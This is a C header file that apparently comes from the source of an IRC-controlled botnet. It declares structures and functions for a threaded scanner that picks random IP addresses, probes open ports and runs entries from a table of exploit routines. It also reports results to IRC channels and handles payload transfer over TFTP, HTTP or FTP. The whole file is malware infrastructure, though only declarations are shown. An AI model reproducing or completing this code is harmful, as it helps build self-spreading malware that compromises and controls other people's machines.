typedef struct ADVSCAN 
{
	char ip[16];
	char chan[128];
	char msgchan[128];
	SOCKET sock;
	unsigned int port;
	unsigned int delay;
	unsigned int minutes;
	unsigned int threadnum;
	unsigned int cthreadnum;
	unsigned int cthreadid;
	unsigned int threads;
	int exploit;
	DWORD host;
	BOOL notice;
	BOOL silent;
	BOOL random;
	BOOL gotinfo;
	BOOL cgotinfo;

} ADVSCAN;


typedef struct ADVINFO {
	unsigned long ip;
	BOOL info;
} ADVINFO;

typedef struct EXINFO {
	SOCKET sock;
	char ip[16];
	char chan[128];
	char command[10];
	unsigned int port;
	unsigned int threadnum;
	int exploit;
	BOOL option;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
} EXINFO;

typedef BOOL (*efptr)(EXINFO exinfo);
typedef BOOL (&efref)(EXINFO exinfo);

typedef struct EXPLOIT {
	char command[10];
	char name[128];
	unsigned int port;
	efptr exfunc;
	unsigned int stats;
	BOOL tftp;
	BOOL http;
	BOOL ftp;
} EXPLOIT;

void ListExploitStats(SOCKET sock, char *chan, BOOL notice);
void currentIP(SOCKET sock, char *chan, BOOL notice, int threadnum);
void CheckServers(ADVSCAN scan);
unsigned long AdvGetNextIP(int threadnum);
unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum);
BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay);
DWORD WINAPI AdvPortScanner(LPVOID param);
DWORD WINAPI AdvScanner(LPVOID param);
void DelPayloadFile(SOCKET sock, char *chan, BOOL notice, BOOL silent);